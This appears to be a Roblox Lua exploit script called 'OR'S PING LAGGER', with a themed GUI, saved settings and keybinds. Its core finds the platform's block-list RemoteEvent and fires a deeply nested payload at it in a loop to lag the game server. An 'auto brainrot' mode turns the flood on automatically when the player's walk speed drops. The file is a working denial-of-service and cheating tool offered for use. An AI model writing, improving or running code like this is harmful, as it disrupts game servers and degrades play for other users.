-- OR'S PING LAGGER | Compact + Vertical Menu + Clean Black/White/Grey Theme
local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local RunService       = game:GetService("RunService")
local TweenService     = game:GetService("TweenService")

local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

-- Paleta de colores: Negro, Blanco y Gris
local THEME_BLACK = Color3.fromRGB(15, 15, 15)
local THEME_DARK_GRAY = Color3.fromRGB(25, 25, 25)
local THEME_GRAY = Color3.fromRGB(45, 45, 45)
local THEME_LIGHT_GRAY = Color3.fromRGB(180, 180, 180)
local THEME_WHITE = Color3.fromRGB(255, 255, 255)
local ACCENT_GRAY = Color3.fromRGB(70, 70, 70)

-------------------------------------------------
-- ASSET ID FORMATTER
-------------------------------------------------
local function formatAssetId(id)
    if not id or id == "" then return "" end
    local cleanId = tostring(id):gsub("%D", "")
    return "rbxthumb://type=Asset&id=" .. cleanId .. "&w=420&h=420"
end

-------------------------------------------------
-- CONFIG & SAVE
-------------------------------------------------
local CONFIG_FILE = "ORSPingLagger_Config.json"

local DEFAULT_CFG = {
	power        = 100000,
	interval     = 0.125,
	keybind      = "F",
    autoBrainrot = true,
    background   = formatAssetId("135008265511145"),
}

local cfg = {
	power        = DEFAULT_CFG.power,
	interval     = DEFAULT_CFG.interval,
	keybind      = DEFAULT_CFG.keybind,
    autoBrainrot = DEFAULT_CFG.autoBrainrot,
    background   = DEFAULT_CFG.background,
}

local function resolveKey(name)
	if not name or name == "" or name == "None" then return nil end
	local ok, val = pcall(function() return Enum.KeyCode[name] end)
	return (ok and val) or nil
end

local function saveConfig()
	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
	if ok and encoded and writefile then
		pcall(writefile, CONFIG_FILE, encoded)
	end
end

local function loadConfig()
	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if not ok or type(data) ~= "table" then return end

	cfg.power        = tonumber(data.power) or DEFAULT_CFG.power
	cfg.interval     = tonumber(data.interval) or DEFAULT_CFG.interval
	cfg.keybind      = type(data.keybind) == "string" and data.keybind or DEFAULT_CFG.keybind
    cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
    cfg.background   = type(data.background) == "string" and data.background or DEFAULT_CFG.background
end

loadConfig()

-------------------------------------------------
-- STATE
-------------------------------------------------
local active            = false
local listeningFor      = false
local remote            = nil
local brainrotMode      = false
local lastBrainrotState = false
local manualOverride    = false
local uiLocked          = false
local refreshUI

local BLACKLISTED = {
	[Enum.KeyCode.Escape]      = true,
	[Enum.KeyCode.LeftControl] = true,
	[Enum.KeyCode.Unknown]     = true,
}

-------------------------------------------------
-- CHARACTER TITLE (OR'S + RAYA BLANCA ABAJO)
-------------------------------------------------
local function addCharacterTitle(character)
    local head = character:WaitForChild("Head", 10)
    if not head then return end

    local oldTitle = head:FindFirstChild("ORSCharacterTitle")
    if oldTitle then oldTitle:Destroy() end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "ORSCharacterTitle"
    billboard.Adornee = head
    billboard.AlwaysOnTop = true
    billboard.LightInfluence = 0
    billboard.MaxDistance = 1000
    billboard.Size = UDim2.new(0, 200, 0, 45)
    billboard.StudsOffset = Vector3.new(0, 3.8, 0)
    billboard.Parent = head

    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, 0, 1, 0)
    container.BackgroundTransparency = 1
    container.Parent = billboard

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 28)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = "OR'S"
    label.TextColor3 = THEME_WHITE
    label.TextStrokeColor3 = THEME_BLACK
    label.TextStrokeTransparency = 0.1
    label.TextScaled = true
    label.Font = Enum.Font.GothamBlack
    label.Parent = container

    local line = Instance.new("Frame")
    line.Size = UDim2.new(0.6, 0, 0, 2)
    line.Position = UDim2.new(0.2, 0, 0, 32)
    line.BackgroundColor3 = THEME_WHITE
    line.BorderSizePixel = 0
    line.Parent = container
end

plr.CharacterAdded:Connect(addCharacterTitle)
if plr.Character then
    task.spawn(addCharacterTitle, plr.Character)
end

-------------------------------------------------
-- PING LAGGER CORE
-------------------------------------------------
local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local rem
	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then rem = r break end
	end
	if not rem then
		for _, c in ipairs(rrs:GetChildren()) do
			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
		end
	end
	return rem
end

remote = findRemote()

local function buildPayload(power)
	local main = {}
	local nested = {{}}
	local current = nested[1]
	for _ = 1, 186 do
		local n = {}
		table.insert(current, n)
		current = n
	end
	local maxRep = math.min(math.floor(power / 188), 10000)
	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

local loopTask = nil
local function setLag(state)
	active = state
	if active then
		if not remote or not remote.Parent then
			remote = findRemote()
		end
		if loopTask then pcall(task.cancel, loopTask) end
		local payload = buildPayload(cfg.power)
		loopTask = task.spawn(function()
			local currentDelay = cfg.interval
			while active do
				if not remote or not remote.Parent then
					remote = findRemote()
					if not remote then task.wait(0.5) continue end
				end
				local ok = pcall(function()
					remote:FireServer(payload)
				end)
				if not ok then
					currentDelay = math.min(currentDelay * 1.5, 0.5)
				else
					currentDelay = math.max(currentDelay * 0.995, 0.05)
				end
				task.wait(currentDelay)
			end
		end)
	else
		if loopTask then pcall(task.cancel, loopTask) end
		loopTask = nil
	end
end

-------------------------------------------------
-- AUTO BRAINROT DETECTION (WalkSpeed < 25)
-------------------------------------------------
RunService.Heartbeat:Connect(function()
	if not cfg.autoBrainrot then
		if brainrotMode then
			brainrotMode = false
			lastBrainrotState = false
		end
		return
	end

	local char = plr.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end

	local hasBrainrot = hum.WalkSpeed < 25

	if hasBrainrot and not lastBrainrotState then
		brainrotMode = true
		lastBrainrotState = true
		manualOverride = false
		if not active then
			setLag(true)
			if refreshUI then refreshUI() end
		end
	elseif not hasBrainrot and lastBrainrotState then
		brainrotMode = false
		lastBrainrotState = false
		manualOverride = false
		if active then
			setLag(false)
			if refreshUI then refreshUI() end
		end
	end
end)

-------------------------------------------------
-- GUI (LIGERO, ANCHO Y PLANO)
-------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ORSPingLagger"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true -- Permite subir la interfaz hasta mero arriba sin bloqueo
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Name = "Main"
frame.Size = UDim2.new(0, 180, 0, 85)
frame.Position = UDim2.new(0.5, -90, 0.5, -42)
frame.BackgroundColor3 = THEME_BLACK
frame.BorderSizePixel = 0
frame.Visible = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Color = THEME_LIGHT_GRAY
stroke.Transparency = 0.4
stroke.Thickness = 1.5
stroke.Parent = frame

local frameGradient = Instance.new("UIGradient")
frameGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 10))
})
frameGradient.Rotation = 90
frameGradient.Parent = frame

local starContainer = Instance.new("Frame")
starContainer.Name = "StarSpaceContainer"
starContainer.Size = UDim2.fromScale(1, 1)
starContainer.BackgroundTransparency = 1
starContainer.ZIndex = 1
starContainer.ClipsDescendants = true
starContainer.Parent = frame

local stars = {}
for i = 1, 20 do
	local s = Instance.new("Frame")
	s.Size = UDim2.fromOffset(math.random(1, 3), math.random(1, 3))
	s.Position = UDim2.fromScale(math.random(), math.random())
	s.BackgroundColor3 = THEME_WHITE
	s.BorderSizePixel = 0
	s.BackgroundTransparency = math.random(20, 70) / 100
	s.ZIndex = 1
	s.Parent = starContainer
	Instance.new("UICorner", s).CornerRadius = UDim.new(1, 0)
	table.insert(stars, {
		frame = s,
		speedX = (math.random(-20, 20) / 100),
		speedY = (math.random(15, 40) / 100),
	})
end

RunService.RenderStepped:Connect(function(dt)
	for _, star in ipairs(stars) do
		local cur = star.frame.Position
		local newX = (cur.X.Scale + star.speedX * dt * 0.1) % 1
		local newY = (cur.Y.Scale + star.speedY * dt * 0.1) % 1
		star.frame.Position = UDim2.fromScale(newX, newY)
	end
end)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -60, 0, 30)
title.Position = UDim2.new(0, 10, 0, 8)
title.BackgroundTransparency = 1
title.Text = "OR'S PING"
title.TextColor3 = THEME_WHITE
title.TextStrokeColor3 = THEME_BLACK
title.TextStrokeTransparency = 0.1
title.TextSize = 12
title.Font = Enum.Font.GothamBlack
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 6
title.Parent = frame

local lockBtn = Instance.new("TextButton")
lockBtn.Size = UDim2.new(0, 22, 0, 22)
lockBtn.Position = UDim2.new(1, -54, 0, 12)
lockBtn.BackgroundColor3 = THEME_GRAY
lockBtn.Text = "🔓"
lockBtn.TextColor3 = THEME_WHITE
lockBtn.TextSize = 11
lockBtn.Font = Enum.Font.GothamBold
lockBtn.ZIndex = 7
lockBtn.Parent = frame

local lockCorner = Instance.new("UICorner")
lockCorner.CornerRadius = UDim.new(0, 6)
lockCorner.Parent = lockBtn

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 22, 0, 22)
closeBtn.Position = UDim2.new(1, -28, 0, 12)
closeBtn.BackgroundColor3 = THEME_DARK_GRAY
closeBtn.Text = "⚙"
closeBtn.TextColor3 = THEME_WHITE
closeBtn.TextSize = 14
closeBtn.Font = Enum.Font.GothamBold
closeBtn.ZIndex = 7
closeBtn.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeBtn

-- Botón Principal (ACTIVATE / DESACTIVE) visible solo en el menú principal
local lagBtn = Instance.new("TextButton")
lagBtn.Name = "MainLagButton"
lagBtn.Size = UDim2.new(1, -20, 0, 32)
lagBtn.Position = UDim2.new(0, 10, 0, 42)
lagBtn.BackgroundColor3 = THEME_DARK_GRAY
lagBtn.BackgroundTransparency = 0.2
lagBtn.BorderSizePixel = 0
lagBtn.Text = active and "DESACTIVE" or "ACTIVATE"
lagBtn.TextColor3 = active and THEME_WHITE or THEME_LIGHT_GRAY
lagBtn.TextStrokeColor3 = THEME_BLACK
lagBtn.TextStrokeTransparency = 0.1
lagBtn.TextSize = 13
lagBtn.Font = Enum.Font.GothamBlack
lagBtn.ZIndex = 5
lagBtn.Parent = frame

local lagCorner = Instance.new("UICorner")
lagCorner.CornerRadius = UDim.new(0, 8)
lagCorner.Parent = lagBtn

local lagStroke = Instance.new("UIStroke")
lagStroke.Color = THEME_WHITE
lagStroke.Transparency = 0.5
lagStroke.Thickness = 1.5
lagStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
lagStroke.Parent = lagBtn

-------------------------------------------------
-- OPTIONS PANEL (OCULTO POR DEFECTO)
-------------------------------------------------
local settingsPanel = Instance.new("Frame")
settingsPanel.Name = "SettingsPanel"
settingsPanel.Size = UDim2.new(1, -20, 1, -50)
settingsPanel.Position = UDim2.new(0, 10, 0, 42)
settingsPanel.BackgroundTransparency = 1
settingsPanel.Visible = false
settingsPanel.ZIndex = 8
settingsPanel.Parent = frame

local function createVerticalLabel(text, yPos)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, 0, 0, 16)
	lbl.Position = UDim2.new(0, 0, 0, yPos)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = THEME_LIGHT_GRAY
	lbl.TextSize = 11
	lbl.Font = Enum.Font.GothamBold
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.ZIndex = 5
	lbl.Parent = settingsPanel
	return lbl
end

local function createVerticalTextBox(yPos, placeholder)
	local box = Instance.new("TextBox")
	box.Size = UDim2.new(1, 0, 0, 22)
	box.Position = UDim2.new(0, 0, 0, yPos)
	box.BackgroundColor3 = THEME_DARK_GRAY
	box.TextColor3 = THEME_WHITE
	box.PlaceholderColor3 = ACCENT_GRAY
	box.PlaceholderText = placeholder
	box.TextSize = 12
	box.Font = Enum.Font.GothamBold
	box.ClearTextOnFocus = false
	box.ZIndex = 5
	box.Parent = settingsPanel

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 6)
	c.Parent = box
	
	local strokeBox = Instance.new("UIStroke")
	strokeBox.Color = THEME_GRAY
	strokeBox.Thickness = 1
	strokeBox.Parent = box
	return box
end

createVerticalLabel("POWER:", 0)
local powerBox = createVerticalTextBox(15, "100000")

createVerticalLabel("DELAY:", 42)
local intervalBox = createVerticalTextBox(57, "0.125")

createVerticalLabel("AUTO BRAINROT", 84)

local toggleTrack = Instance.new("Frame")
toggleTrack.Size = UDim2.new(0, 44, 0, 20)
toggleTrack.Position = UDim2.new(1, -44, 0, 98)
toggleTrack.BackgroundColor3 = cfg.autoBrainrot and THEME_WHITE or THEME_GRAY
toggleTrack.BorderSizePixel = 0
toggleTrack.ZIndex = 5
toggleTrack.Parent = settingsPanel

local trackCorner = Instance.new("UICorner")
trackCorner.CornerRadius = UDim.new(1, 0)
trackCorner.Parent = toggleTrack

local toggleKnob = Instance.new("Frame")
toggleKnob.Size = UDim2.new(0, 16, 0, 16)
toggleKnob.Position = cfg.autoBrainrot and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
toggleKnob.BackgroundColor3 = cfg.autoBrainrot and THEME_BLACK or THEME_WHITE
toggleKnob.BorderSizePixel = 0
toggleKnob.ZIndex = 6
toggleKnob.Parent = toggleTrack

local knobCorner = Instance.new("UICorner")
knobCorner.CornerRadius = UDim.new(1, 0)
knobCorner.Parent = toggleKnob

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(1, 0, 1, 0)
toggleBtn.BackgroundTransparency = 1
toggleBtn.Text = ""
toggleBtn.ZIndex = 7
toggleBtn.Parent = toggleTrack

createVerticalLabel("KEYBIND:", 124)

local keybindBtn = Instance.new("TextButton")
keybindBtn.Size = UDim2.new(0, 60, 0, 22)
keybindBtn.Position = UDim2.new(1, -60, 0, 138)
keybindBtn.BackgroundColor3 = THEME_DARK_GRAY
keybindBtn.Text = cfg.keybind
keybindBtn.TextColor3 = THEME_WHITE
keybindBtn.TextSize = 12
keybindBtn.Font = Enum.Font.GothamBold
keybindBtn.ZIndex = 5
keybindBtn.Parent = settingsPanel

local keybindCorner = Instance.new("UICorner")
keybindCorner.CornerRadius = UDim.new(0, 6)
keybindCorner.Parent = keybindBtn

local keybindStroke = Instance.new("UIStroke")
keybindStroke.Color = THEME_GRAY
keybindStroke.Thickness = 1
keybindStroke.Parent = keybindBtn

-- Botón ACTIVATE/DESACTIVATE colocado DENTRO del panel de configuración
local settingsLagBtn = Instance.new("TextButton")
settingsLagBtn.Name = "SettingsLagButton"
settingsLagBtn.Size = UDim2.new(1, 0, 0, 32)
settingsLagBtn.Position = UDim2.new(0, 0, 0, 168)
settingsLagBtn.BackgroundColor3 = THEME_DARK_GRAY
settingsLagBtn.BackgroundTransparency = 0.2
settingsLagBtn.BorderSizePixel = 0
settingsLagBtn.Text = active and "DESACTIVE" or "ACTIVATE"
settingsLagBtn.TextColor3 = active and THEME_WHITE or THEME_LIGHT_GRAY
settingsLagBtn.TextStrokeColor3 = THEME_BLACK
settingsLagBtn.TextStrokeTransparency = 0.1
settingsLagBtn.TextSize = 12
settingsLagBtn.Font = Enum.Font.GothamBlack
settingsLagBtn.ZIndex = 9
settingsLagBtn.Parent = settingsPanel

local settingsLagCorner = Instance.new("UICorner")
settingsLagCorner.CornerRadius = UDim.new(0, 8)
settingsLagCorner.Parent = settingsLagBtn

local settingsLagStroke = Instance.new("UIStroke")
settingsLagStroke.Color = THEME_WHITE
settingsLagStroke.Transparency = 0.5
settingsLagStroke.Thickness = 1.5
settingsLagStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
settingsLagStroke.Parent = settingsLagBtn

local settingsOpen = false

-------------------------------------------------
-- LOGIC & UI UPDATES
-------------------------------------------------
local function makeMenuDraggable()
	local dragging, dragStart, startPos = false, nil, nil
	frame.InputBegan:Connect(function(input)
		if uiLocked then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			-- Movimiento libre sin topes restrictivos en pantalla
			frame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end

makeMenuDraggable()

local function updateToggleVisual()
	local goalPos = cfg.autoBrainrot and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
	local goalTrackColor = cfg.autoBrainrot and THEME_WHITE or THEME_GRAY
	local goalKnobColor = cfg.autoBrainrot and THEME_BLACK or THEME_WHITE
	TweenService:Create(toggleKnob, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Position = goalPos, BackgroundColor3 = goalKnobColor}):Play()
	TweenService:Create(toggleTrack, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {BackgroundColor3 = goalTrackColor}):Play()
end

refreshUI = function()
	powerBox.Text = tostring(cfg.power)
	intervalBox.Text = tostring(tonumber(string.format("%.3f", cfg.interval)))
	keybindBtn.Text = listeningFor and "..." or cfg.keybind
	updateToggleVisual()
	lockBtn.Text = uiLocked and "🔒" or "🔓"
	
	local statusText = active and "DESACTIVE" or "ACTIVATE"
	local statusColor = active and THEME_WHITE or THEME_LIGHT_GRAY
	
	lagBtn.Text = statusText
	lagBtn.TextColor3 = statusColor
	
	settingsLagBtn.Text = statusText
	settingsLagBtn.TextColor3 = statusColor
end

powerBox.FocusLost:Connect(function()
	local num = tonumber(powerBox.Text)
	if num and num >= 1 then cfg.power = math.floor(num) saveConfig() end
	refreshUI()
end)

intervalBox.FocusLost:Connect(function()
	local num = tonumber(intervalBox.Text)
	if num and num >= 0.01 then cfg.interval = num saveConfig() end
	refreshUI()
end)

keybindBtn.MouseButton1Click:Connect(function() listeningFor = true refreshUI() end)

toggleBtn.MouseButton1Click:Connect(function()
	cfg.autoBrainrot = not cfg.autoBrainrot
	if cfg.autoBrainrot then
		manualOverride = false
	end
	saveConfig()
	refreshUI()
end)

local function triggerLagAction()
	active = not active
	manualOverride = not active
	setLag(active)
	refreshUI()
end

lagBtn.MouseButton1Click:Connect(triggerLagAction)
settingsLagBtn.MouseButton1Click:Connect(triggerLagAction)

lockBtn.MouseButton1Click:Connect(function()
	uiLocked = not uiLocked
	refreshUI()
end)

closeBtn.MouseButton1Click:Connect(function()
	settingsOpen = not settingsOpen
	settingsPanel.Visible = settingsOpen
	lagBtn.Visible = not settingsOpen
	settingsPanel.Visible = settingsOpen
	lagBtn.Visible = not settingsOpen
    
	-- Altura 255px para que el botón quede bien adentro y sin cambiar la posición actual
	local targetSize = settingsOpen and UDim2.new(0, 180, 0, 255) or UDim2.new(0, 180, 0, 85)
	local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(frame, tweenInfo, {
		Size = targetSize
	}):Play()
end)

UserInputService.InputBegan:Connect(function(input, processed)
	local kc = input.KeyCode
	if kc == Enum.KeyCode.Unknown then return end
	if listeningFor then
		if kc == Enum.KeyCode.Escape then listeningFor = false refreshUI() return end
		if not BLACKLISTED[kc] then cfg.keybind = kc.Name listeningFor = false saveConfig() refreshUI() end
		return
	end
	local keyEnum = resolveKey(cfg.keybind)
	if keyEnum and kc == keyEnum then
		active = not active
		manualOverride = not active
		setLag(active)
		refreshUI()
		return
	end
	if processed then return end
end)

refreshUI()